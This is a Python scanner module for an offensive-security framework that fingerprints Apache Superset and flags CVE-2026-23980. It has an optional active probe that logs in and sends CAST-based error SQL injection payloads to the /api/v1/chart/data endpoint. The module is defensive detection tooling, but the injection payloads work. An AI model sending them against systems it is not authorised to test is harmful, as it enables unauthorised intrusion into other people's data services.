#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
from typing import Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Apache Superset CVE-2026-23980 detection",
        "description": (
            "Detects Apache Superset and flags versions < 6.0.0 as affected by "
            "CVE-2026-23980 (authenticated error-based SQLi via chart/data "
            "sqlExpression/where). Optional credential probe confirms injection."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-23980",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-23980",
            "https://github.com/advisories/GHSA-gvxg-9hqx-f4rg",
            "https://lists.apache.org/thread.html",
            "https://github.com/oscar-mine/CVE-2026-23980-Exploit"],
        "modules": [
            "auxiliary/scanner/http/superset_cve_2026_23980_sqli"],
        "tags": [
            "web",
            "scanner",
            "superset",
            "apache",
            "sqli",
            "cve-2026-23980"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["superset", "apache"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/api/v1/chart/data", "/login/"],
                "param_any": ["sqlExpression"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "auxiliary/scanner/http/superset_cve_2026_23980_sqli"],
            },
        },
    }

    port = OptPort(8088, "Superset HTTP port (default 8088)", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    username = OptString("", "Optional username for active SQLi confirmation", required=False)
    password = OptString("", "Optional password for active SQLi confirmation", required=False)
    anonymous = OptBool(
        False,
        "Try PUBLIC_ROLE anonymous access before credential login",
        required=False,
    )
    active_probe = OptBool(
        False,
        "When credentials/anonymous work, confirm CAST error-based SQLi",
        required=False,
    )

    def _timeout(self) -> int:
        return max(int(self.timeout or 10), 5)

    @staticmethod
    def _version_tuple(value: str) -> Optional[Tuple[int, ...]]:
        parts = []
        for part in str(value or "").split(".")[:3]:
            digits = "".join(ch for ch in part if ch.isdigit())
            if not digits:
                return None
            parts.append(int(digits))
        return tuple(parts) if parts else None

    def _is_vulnerable_version(self, version: str) -> bool:
        parsed = self._version_tuple(version)
        if not parsed:
            return False
        return parsed[0] < 6

    def _get_version(self) -> str:
        for path in ("/api/v1/version", "/version", "/health"):
            response = self.http_request(
                method="GET",
                path=path,
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if not response or response.status_code != 200:
                continue
            try:
                data = response.json()
            except Exception:
                data = None
            if isinstance(data, dict):
                result = data.get("result") if isinstance(data.get("result"), dict) else {}
                for key in ("version", "VERSION_STRING"):
                    if data.get(key):
                        return str(data[key])
                    if result.get(key):
                        return str(result[key])
            text = response.text or ""
            match = re.search(r'"version"\s*:\s*"([^"]+)"', text)
            if match:
                return match.group(1)
        return ""

    def _looks_like_superset(self) -> bool:
        for path in ("/login/", "/login", "/", "/superset/welcome/"):
            response = self.http_request(
                method="GET",
                path=path,
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if not response:
                continue
            text = (response.text or "").lower()
            if "superset" in text and ("sign in" in text or "login" in text or "apache"):
                return True
            if "superset" in text:
                return True
        return bool(self._get_version())

    def _login(self, username: str, password: str) -> bool:
        response = self.http_request(
            method="POST",
            path="/api/v1/security/login",
            json={
                "username": username,
                "password": password,
                "provider": "db",
                "refresh": True,
            },
            timeout=self._timeout(),
            allow_redirects=False,
        )
        if not response or response.status_code != 200:
            return False
        try:
            token = (response.json() or {}).get("access_token")
        except Exception:
            token = None
        if not token:
            return False
        self.http_headers = dict(getattr(self, "http_headers", None) or {})
        self.http_headers["Authorization"] = f"Bearer {token}"

        csrf = self.http_request(
            method="GET",
            path="/api/v1/security/csrf_token/",
            timeout=self._timeout(),
        )
        if csrf and csrf.status_code == 200:
            try:
                value = (csrf.json() or {}).get("result")
            except Exception:
                value = None
            if value:
                self.http_headers["X-CSRFToken"] = str(value)
        return True

    def _auth_headers(self) -> dict:
        return dict(getattr(self, "http_headers", None) or {})

    def _test_injection(self, ds_id: int = 1) -> Optional[str]:
        marker = "sqli_test_xyzzy"
        probes = (
            (
                "sqlExpression",
                {
                    "datasource": {"id": ds_id, "type": "table"},
                    "queries": [
                        {
                            "columns": [
                                {
                                    "label": "injected",
                                    "sqlExpression": f"CAST('{marker}' AS INT)",
                                    "expressionType": "SQL",
                                }
                            ],
                            "metrics": [],
                            "filters": [],
                            "extras": {"having": "", "where": ""},
                            "row_limit": 1,
                            "time_range": "No filter",
                        }
                    ],
                    "result_format": "json",
                    "result_type": "full",
                },
            ),
            (
                "where",
                {
                    "datasource": {"id": ds_id, "type": "table"},
                    "queries": [
                        {
                            "columns": [],
                            "metrics": [
                                {
                                    "label": "cnt",
                                    "expressionType": "SQL",
                                    "sqlExpression": "COUNT(*)",
                                }
                            ],
                            "filters": [],
                            "extras": {
                                "having": "",
                                "where": f"1=1 AND CAST('{marker}' AS INT) > 0",
                            },
                            "row_limit": 1,
                            "time_range": "No filter",
                        }
                    ],
                    "result_format": "json",
                    "result_type": "full",
                },
            ),
        )
        for point, body in probes:
            response = self.http_request(
                method="POST",
                path="/api/v1/chart/data",
                json=body,
                headers=self._auth_headers(),
                timeout=max(self._timeout(), 15),
                allow_redirects=False,
            )
            if response and marker in (response.text or ""):
                return point
        return None

    def _first_dataset_id(self) -> Optional[int]:
        response = self.http_request(
            method="GET",
            path="/api/v1/dataset/",
            params={"q": "(page_size:5)"},
            headers=self._auth_headers(),
            timeout=self._timeout(),
        )
        if not response or response.status_code != 200:
            return None
        try:
            rows = (response.json() or {}).get("result") or []
        except Exception:
            return None
        if rows and isinstance(rows[0], dict) and rows[0].get("id") is not None:
            return int(rows[0]["id"])
        return None

    def run(self):
        print_status(f"Probing Apache Superset on port {self.port}...")

        if not self._looks_like_superset():
            print_info("Superset not detected")
            return False

        version = self._get_version()
        if version:
            print_success(f"Superset version: {version}")
        else:
            print_status("Superset detected; version unknown")

        vulnerable_version = self._is_vulnerable_version(version) if version else False
        if version and vulnerable_version:
            print_warning(f"Version {version} < 6.0.0 — potentially affected by CVE-2026-23980")
        elif version:
            print_info(f"Version {version} is at/above 6.0.0 (fixed line)")

        confirmed = False
        injection_point = None
        username = str(self.username or "").strip()
        password = str(self.password or "")

        if self.active_probe and (self.anonymous or (username and password)):
            authed = False
            if self.anonymous:
                # Soft anonymous session: CSRF only, then injection/dataset probes.
                csrf = self.http_request(
                    method="GET",
                    path="/api/v1/security/csrf_token/",
                    timeout=self._timeout(),
                )
                if csrf and csrf.status_code == 200:
                    try:
                        value = (csrf.json() or {}).get("result")
                    except Exception:
                        value = None
                    if value:
                        self.http_headers = {"X-CSRFToken": str(value)}
                        authed = True
                        print_status("Anonymous CSRF obtained; probing chart/data")

            if not authed and username and password:
                if self._login(username, password):
                    authed = True
                    print_success(f"Authenticated as {username}")
                else:
                    print_warning("Login failed; skipping active SQLi confirmation")

            if authed:
                ds_id = self._first_dataset_id() or 1
                injection_point = self._test_injection(ds_id)
                if injection_point:
                    confirmed = True
                    print_success(
                        f"Error-based SQLi confirmed via {injection_point} "
                        f"(dataset id={ds_id})"
                    )
                else:
                    print_info("Authenticated but injection marker not reflected")

        if confirmed:
            self.set_info(
                severity="high",
                cve="CVE-2026-23980",
                reason=(
                    f"CVE-2026-23980 confirmed via {injection_point} on /api/v1/chart/data "
                    f"(version={version or 'unknown'})"
                ),
                confidence="high",
                version=version,
                injection_point=injection_point,
            )
            return True

        if vulnerable_version:
            self.set_info(
                severity="high",
                cve="CVE-2026-23980",
                reason=(
                    f"Superset {version} < 6.0.0 may be vulnerable to authenticated "
                    "chart/data SQLi (set username/password + active_probe to confirm)"
                ),
                confidence="medium",
                version=version,
            )
            return True

        self.set_info(
            severity="info",
            cve="CVE-2026-23980",
            reason=(
                f"Superset detected (version={version or 'unknown'}); "
                "not confirmed vulnerable"
            ),
            confidence="low",
            version=version,
        )
        return True
